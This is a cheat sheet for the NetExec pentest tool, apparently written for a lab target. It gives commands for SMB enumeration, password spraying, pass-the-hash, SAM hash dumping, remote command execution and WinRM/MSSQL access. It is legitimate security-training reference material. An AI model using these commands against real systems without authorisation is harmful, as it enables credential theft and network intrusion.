### NetExec (nxc) Cheat Sheet

NetExec (nxc) is the modern successor to CrackMapExec — faster, actively maintained, Python 3.11+ compatible. Syntax mirrors old CME (`nxc smb` = `cme smb`).

**Install**: `sudo apt install netexec` (Kali) or pip.

**Basic Syntax**:
```bash
nxc <protocol> <target> [options]
```
Protocols: smb, winrm, mssql, ldap, rdp, ssh, ftp.

**Common Flags**:
- `-u <user>` / `-p <pass>`: Single cred.
- `-u users.txt -p passes.txt`: List spray.
- `--continue-on-success`: Don't stop on valid.
- `-M <module>`: Load module (e.g., spider_plus).
- `-x <cmd>`: Execute command on success.
- `--local-auth`: Local (not domain).
- `--shares/--users/--rid-brute/--sam`: Enum options.

#### 1. SMB Enumeration
```bash
nxc smb 10.129.6.135                  # Basic connect + info
nxc smb 10.129.6.135 --shares         # List shares
nxc smb 10.129.6.135 -u '' -p '' --shares   # Null session shares
nxc smb 10.129.6.135 -u 'guest' -p '' --shares   # Guest try
nxc smb 10.129.6.135 --users          # Domain users (if auth)
nxc smb 10.129.6.135 --rid-brute      # RID brute users
```

#### 2. Credential Validation/Spray
```bash
nxc smb 10.129.6.135 -u admin -p 'Password123'   # Single test
nxc smb 10.129.6.135 -u users.txt -p 'Pass123' --continue-on-success   # Spray
nxc smb 10.129.6.135 -u users.txt -H <NT_HASH>   # Pass-the-Hash
```

#### 3. Execution (Post-Creds)
```bash
nxc smb 10.129.6.135 -u admin -p pass -x "whoami"   # Run command
nxc smb 10.129.6.135 -u admin -p pass -M spider_plus   # Spider shares
nxc smb 10.129.6.135 -u admin -p pass --sam           # Dump SAM (admin)
```

#### 4. WinRM (Shell Preferred)
```bash
nxc winrm 10.129.6.135 -u admin -p pass   # Test
nxc winrm 10.129.6.135 -u admin -H <NT>   # PTH
```

#### 5. Other Protocols
```bash
nxc mssql 10.129.6.135 -u sa -p pass      # MSSQL enum/exec
nxc ldap 10.129.6.135 -u user -p pass --users   # AD users/groups
```

**Pro Tips**:
- Use `-d <domain>` for domain auth.
- `--gen-relay-list`: For NTLM relay targets.
- Modules: `-M enum_shares`, `-M get-laps`.
